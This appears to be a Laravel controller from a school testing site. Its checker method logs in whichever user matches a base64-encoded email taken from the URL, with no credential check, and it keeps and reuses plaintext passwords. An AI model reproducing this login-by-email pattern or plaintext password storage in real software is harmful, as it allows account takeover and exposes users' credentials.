<?php

namespace App\Http\Controllers;
use Illuminate\Support\Facades\Auth;
use Illuminate\Http\Request;
use App\Models\User;
use DB;
use Illuminate\Support\Facades\Artisan;

class JointController extends Controller
{
    public function checker($dddGig)
    {
        //Artisan::call('cache:clear');
        //Artisan::call('config:clear');
        //Artisan::call('route:clear');
        
        //$email="admin123@gmail.com";
        $date=date('Y-m-d H:i:s');
        $email=base64_decode($dddGig);
        //dd($email);
        $user=User::where('email', $email)->first();
        
        
        if($user)
        {
            Auth::login($user);
            $vibleP=bcrypt($user->visible_password);
            
            $user->update(array(
                    'password'=>$vibleP,
                    'visible_password'=>$user->visible_password, 
                    'created_at'=>$date
                ));
            return redirect()->route('home');
        }
        else{
            echo "<script type='text/javascript'>";
            echo "alert('Access is Denied! ');";
            echo "window.location='https://schooldrive.com.ng/educareprimary/index.php/cbt/init'";
            echo "</script>";
        }
    }
}
